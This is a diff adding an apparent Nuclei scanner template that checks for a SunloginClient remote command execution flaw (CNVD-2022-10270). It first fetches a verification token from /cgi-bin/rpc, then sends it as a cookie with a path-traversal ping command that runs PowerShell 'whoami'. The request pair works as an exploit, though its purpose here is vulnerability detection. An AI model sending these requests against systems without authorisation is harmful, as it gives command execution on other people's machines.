@@ -1,0 +1,51 @@
+id: sunloginclient-ping-rce
+
+info:
+  name: SunloginClient Ping Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    SunloginClient contains a remote execution vulnerability in the ping parameter,
+    allowing an attacker to execute arbitrary commands and potentially control the
+    server.
+  tags: command-execution
+  classification:
+    cwe-id: [CWE-78]
+  reference:
+    - https://cnvd.org.cn/flaw/show/CNVD-2022-10270
+
+http:
+  - id: step1
+    raw:
+      - |
+        GET /cgi-bin/rpc?action=verify-haras HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - '"verify_string":"(.*?)",'
+    extractors:
+      - type: regex
+        name: verify_string
+        regex:
+          - '"verify_string":"(.*?)",'
+        group: 1
+        internal: true
+
+  - id: step2
+    raw:
+      - |
+        GET /check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+whoami HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: CID={{verify_string}}
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "system"
+    matchers-condition: and
